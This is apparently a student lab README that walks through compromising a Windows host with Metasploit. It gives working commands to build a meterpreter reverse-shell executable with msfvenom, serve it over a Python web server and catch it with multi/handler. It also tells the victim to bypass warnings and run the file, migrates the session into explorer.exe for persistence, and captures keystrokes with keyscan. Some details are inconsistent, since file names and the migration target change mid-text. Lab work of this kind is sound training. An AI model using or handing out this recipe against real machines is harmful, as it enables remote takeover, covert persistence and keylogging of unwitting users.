# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="639" height="503" alt="Screenshot 2025-09-22 142652" src="https://github.com/user-attachments/assets/dc04194d-48b4-495b-a16e-e5a807ccda2e" />


Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > dharunya.exe```

### Output:
<img width="627" height="255" alt="image" src="https://github.com/user-attachments/assets/d2767749-49eb-41d6-8963-0e31d62b7fa2" />


Start python server ```python3 -m http.server``` 

<img width="623" height="162" alt="image" src="https://github.com/user-attachments/assets/2743fda8-a9e3-4a4c-8228-a5ce39ce012b" />


Invoke msfconsole:

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 

<img width="622" height="442" alt="Screenshot 2025-09-22 094250" src="https://github.com/user-attachments/assets/8f59d4b7-7ded-459a-8fe7-d0e05fb13579" />

<img width="636" height="444" alt="Screenshot 2025-09-22 094304" src="https://github.com/user-attachments/assets/b37f8932-2952-4b1a-a302-70ca0a45c2df" />

Type help or a question mark "?" or help to see the list of all available commands you can use inside msfconsole.

### Output

<img width="897" height="869" alt="Screenshot 2025-09-27 091122" src="https://github.com/user-attachments/assets/0130b1a9-5684-408c-a1e8-2ff2a1fb1ca4" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

### Output

<img width="636" height="444" alt="Screenshot 2025-09-22 094304" src="https://github.com/user-attachments/assets/28d309a4-23cc-4fa9-a763-aa69c3b67fc9" />

<img width="881" height="116" alt="Screenshot 2025-09-29 094207" src="https://github.com/user-attachments/assets/734d98ba-8909-4a20-942d-292f3e4534f5" />

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/.exe``` The file "dharunya.exe" downloads.

### Output

<img width="806" height="612" alt="Screenshot 2025-09-22 093823" src="https://github.com/user-attachments/assets/e57d7ebe-8dc8-46c2-b232-9e84765c9ed5" />

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the dharunya.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

